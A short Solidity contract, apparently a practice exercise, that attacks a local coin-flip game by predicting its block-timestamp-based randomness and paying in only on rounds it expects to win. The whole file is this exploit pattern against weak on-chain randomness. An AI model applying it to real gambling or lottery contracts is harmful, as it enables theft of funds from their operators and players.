// SPDX-License-Identifier: MIT
pragma solidity >0.8.4;
import "hardhat/console.sol";
import "./Gmae.sol";

error dontWin();
    contract hackgame {
        
    receive() external payable {
        
    }

    fallback() external payable{

    }
   
    // Generate a random number between 1 and 100:
    // if random value >90 <100 then user win otherwise fail
    function FlipCoin(flipCoin value)external  {
    
    for(uint256 i=50000; i<50005; i++){
     uint256 time = block.timestamp;
     uint256 random = uint(keccak256(abi.encodePacked(i, address(this), time))) % 100;
    if(random>90){
        value.FlipCoin{value:i}(); 
        console.log("done");
    } 
   
    } 
    
    }

     function blockTimes()public view returns(uint256){
        return block.timestamp;
    }

}
